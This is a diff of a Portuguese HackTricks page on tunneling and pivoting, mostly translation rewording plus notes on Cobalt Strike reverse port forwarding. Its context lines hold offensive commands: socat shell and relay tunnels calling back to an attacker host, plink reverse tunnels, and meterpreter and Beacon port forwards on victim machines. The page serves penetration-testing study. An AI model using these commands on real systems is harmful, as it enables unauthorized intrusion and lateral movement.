@@ -4,7 +4,7 @@
 
 <summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
@@ -14,7 +14,7 @@
 
 **Grupo de Segurança Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -87,7 +87,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-É necessário **root em ambos os dispositivos** (pois você vai criar novas interfaces) e a configuração do sshd deve permitir login como root:\
+É necessário **root em ambos os dispositivos** (pois você vai criar novas interfaces) e a configuração do sshd deve permitir login de root:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -123,14 +123,14 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Porta local --> Host comprometido (sessão ativa) --> Terceiro\_host:Porta
+Porta local --> Host comprometido (sessão ativa) --> Terceira\_caixa:Porta
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-SOCKS (Socket Secure) é um protocolo de rede que permite a comunicação de pacotes entre clientes e servidores através de um firewall. Ele atua como um intermediário que encaminha o tráfego de rede entre o cliente e o servidor, permitindo a conexão a partir de uma rede interna ou privada. O SOCKS opera na camada 5 do modelo OSI (camada de sessão) e pode ser usado para realizar tunneling e port forwarding.
+SOCKS (Socket Secure) é um protocolo de rede que permite a comunicação de pacotes entre clientes e servidores através de um servidor proxy. Ele pode ser usado para rotear o tráfego da rede de forma segura e anônima, facilitando a criação de túneis para acessar recursos de rede internos de forma remota.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -172,10 +172,16 @@ Neste caso, a **porta é aberta no host de beacon**, não no Servidor da Equipe 
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
+Para observar:
+
+- O encaminhamento de porta reversa do Beacon é projetado para **tunelar o tráfego para o Servidor da Equipe, não para retransmitir entre máquinas individuais**.
+- O tráfego é **tunelado dentro do tráfego C2 do Beacon**, incluindo links P2P.
+- **Privilégios de administrador não são necessários** para criar encaminhamentos de porta reversa em portas altas.
+
 ### rPort2Port local
 
 {% hint style="warning" %}
-Neste caso, a **porta é aberta no host do beacon**, não no Team Server e o **tráfego é enviado para o cliente Cobalt Strike** (não para o Team Server) e a partir daí para o host:porta indicado.
+Neste caso, a **porta é aberta no host do beacon**, não no Servidor da Equipe e o **tráfego é enviado para o cliente Cobalt Strike** (não para o Servidor da Equipe) e a partir daí para o host:porta indicado.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -191,7 +197,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-Você pode baixá-lo na página de lançamentos de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+Você pode baixá-lo na página de lançamentos do [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
 Você precisa usar a **mesma versão para cliente e servidor**
 
 ### socks
@@ -269,7 +275,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 ### Túnel SSL com Socat
 
-**Console /bin/sh**
+**/bin/sh console**
 
 Criar certificados em ambos os lados: Cliente e Servidor
 ```bash
@@ -285,9 +291,9 @@ chmod 600 $FILENAME.key $FILENAME.pem
 attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
 victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
 ```
-### Porta a Porta Remoto
+### Porta2Porta Remoto
 
-Conecte a porta SSH local (22) à porta 443 do host atacante
+Conecte a porta SSH local (22) à porta 443 do host do atacante
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -295,9 +301,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-É como uma versão console do PuTTY (as opções são muito semelhantes a um cliente ssh).
+É como uma versão de console do PuTTY (as opções são muito semelhantes a um cliente ssh).
 
-Como este binário será executado na vítima e é um cliente ssh, precisamos abrir nosso serviço ssh e porta para que possamos ter uma conexão reversa. Em seguida, encaminhe apenas a porta acessível localmente para uma porta em nossa máquina:
+Como este binário será executado na vítima e é um cliente ssh, precisamos abrir nosso serviço ssh e porta para que possamos ter uma conexão reversa. Em seguida, para encaminhar apenas a porta acessível localmente para uma porta em nossa máquina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -319,7 +325,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ## SocksOverRDP & Proxifier
 
 É necessário ter **acesso RDP sobre o sistema**.\
-Download:
+Baixe:
 
 1. [Binários SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta utiliza `Dynamic Virtual Channels` (`DVC`) do recurso de Serviço de Área de Trabalho Remota do Windows. O DVC é responsável por **tunelar pacotes sobre a conexão RDP**.
 2. [Binário Portátil do Proxifier](https://www.proxifier.com/download/#win-tab)
@@ -329,13 +335,13 @@ No seu computador cliente, carregue **`SocksOverRDP-Plugin.dll`** assim:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Agora podemos **conectar** à **vítima** via **RDP** usando **`mstsc.exe`**, e devemos receber um **prompt** informando que o plugin **SocksOverRDP está habilitado**, e ele irá **escutar** em **127.0.0.1:1080**.
+Agora podemos **conectar** à **vítima** via **RDP** usando **`mstsc.exe`**, e devemos receber um **prompt** informando que o **plugin SocksOverRDP está habilitado**, e ele irá **escutar** em **127.0.0.1:1080**.
 
 **Conecte** via **RDP** e faça upload e execute na máquina da vítima o binário `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Agora, confirme em sua máquina (atacante) que a porta 1080 está ouvindo:
+Agora, confirme em sua máquina (atacante) que a porta 1080 está escutando:
 ```
 netstat -antb | findstr 1080
 ```
@@ -486,7 +492,7 @@ chmod a+x ./ngrok
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Capturando chamadas HTTP
+#### Captura de chamadas HTTP
 
 *Útil para XSS, SSRF, SSTI ...*
 Diretamente do stdout ou na interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
@@ -522,7 +528,7 @@ addr: file:///tmp/httpbin/
 
 **Grupo de Segurança Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
